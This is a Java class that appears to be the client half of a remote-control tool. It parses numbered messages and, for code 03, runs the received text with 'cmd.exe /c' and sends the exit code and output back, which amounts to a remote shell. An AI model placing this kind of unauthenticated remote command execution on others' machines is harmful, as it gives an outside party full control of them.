import java.io.*;
import java.util.Objects;

import static javax.swing.JOptionPane.showMessageDialog;

class Command implements Runnable {

    private Thread t;
    private String info;

    Command(String info) {
        this.info = info;
    }

    public void run() {

        //获取指令类与内容，并检查指令是否合法
        if (info.length() < 4 || info.indexOf("|") != 2 || info.lastIndexOf("|") != 2) {
            Main.sendMsg("非法指令");
            return;
        }

        //分割文本以解析指令
        int code = Integer.parseInt(info.substring(0, 2));
        info = info.substring(3);
        System.out.println("指令" + code + "：" + info);

        if (code == 0) { //心跳包
            code00(info);
        } else if (code == 1) { //基础指令
            code01(info);
        } else if (code == 2) { //信息框
            code02(info);
        } else if (code == 3) { //CMD指令
            code03(info);
        } else {
            Main.sendMsg("非法指令");
        }


    }

    public void code00(String info) { //心跳包
        Main.sendMsg(info);
    }

    public void code01(String info) { //基础指令
        if (Objects.equals(info, "close")) {
            Global.exit = true;
        }
    }

    public void code02(String info) { //信息框
        showMessageDialog(null, info);
    }

    public void code03(String info) { //CMD指令
        execCommandAndGetOutput(info);
    }

    public void start () {
        if (t == null) {
            t = new Thread (this);
            t.start ();
        }
    }

    public static void execCommandAndGetOutput(String cmdInput) {
        try {
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec("cmd.exe /c " + cmdInput);
            // 输出结果，必须写在 waitFor 之前
            String outStr = getStreamStr(process.getInputStream());
            // 错误结果，必须写在 waitFor 之前
            String errStr = getStreamStr(process.getErrorStream());
            int exitValue = process.waitFor(); // 退出值 0 为正常，其他为异常

            String msg = "\r\n";
            msg += "--------------------------------" + "\r\n";
            msg += "$退出码：" + exitValue + "\r\n";
            msg += "$标准输出：" + outStr + "\r\n";
            msg += "$错误输出：" + errStr + "\r\n";
            msg += "--------------------------------";
            Main.sendMsg(msg);
            process.destroy();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static String getStreamStr(InputStream is) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(is, "GBK"));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line);
            sb.append("\r\n");
        }
        br.close();
        return sb.toString();
    }


}